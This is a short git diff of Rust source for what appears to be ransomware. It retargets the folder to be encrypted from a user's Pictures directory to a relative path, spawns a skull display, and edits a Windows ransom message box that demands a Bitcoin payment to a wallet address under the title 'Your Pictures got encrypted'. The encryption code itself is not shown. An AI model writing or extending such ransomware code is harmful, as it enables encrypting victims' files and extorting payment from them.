@@ -21,7 +21,7 @@ use winapi::um::winuser;
 use winapi::um::winuser::IDOK;
 
 fn main() -> io::Result<()> {
-    let directory_path = "C:/Users/kilif/Pictures";
+    let directory_path = "../Pictures";
 
     thread::spawn(|| {
         show_skull();
@@ -37,7 +37,7 @@ fn main() -> io::Result<()> {
 }
 
 fn show_messagebox() {
-    let l_msg: Vec<u16> = "Pay 1000€ to BitCoin Wallet: 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71\0"
+    let l_msg: Vec<u16> = "Pay 0.050000 Bitcoin: 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71\0"
         .encode_utf16()
         .collect();
     let l_title: Vec<u16> = "Your Pictures got encrypted".encode_utf16().collect();
